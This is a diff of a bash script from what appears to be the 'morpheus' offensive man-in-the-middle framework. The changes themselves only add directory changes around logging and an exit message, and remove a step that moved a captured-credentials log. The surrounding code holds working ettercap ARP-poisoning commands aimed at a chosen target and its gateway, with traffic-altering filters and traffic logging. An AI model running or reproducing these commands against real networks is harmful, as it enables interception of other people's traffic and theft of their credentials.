@@ -220,8 +220,10 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
         else
+        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
+        cd $IPATH
         fi
 
       else
@@ -230,8 +232,10 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
         else
+        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
+        cd $IPATH
         fi
       fi
     
@@ -241,11 +245,6 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
   mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
   # port-forward
   echo "0" > /proc/sys/net/ipv4/ip_forward
-  if [ -e $IPATH/credentials_log ]; then
-  mv $IPATH/credentials_log $IPATH/logs/credentials_log > /dev/null 2>&1
-  else
-  echo "do nothing" > /dev/null 2>&1
-  fi
   sleep 2
 
 else
@@ -300,8 +299,10 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
         else
+        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
+        cd $IPATH
         fi
 
       else
@@ -310,8 +311,10 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
         else
+        cd $IPATH/logs
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
         ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
+        cd $IPATH
         fi
       fi
     
@@ -369,6 +372,8 @@ sleep 2
 }
 
 sh_exit () {
+echo ${BlueF}[☠]${white} Exit morpheus '(blue_dream)' framework${RedF}! ${Reset};
+sleep 2
 clear
 exit
 }
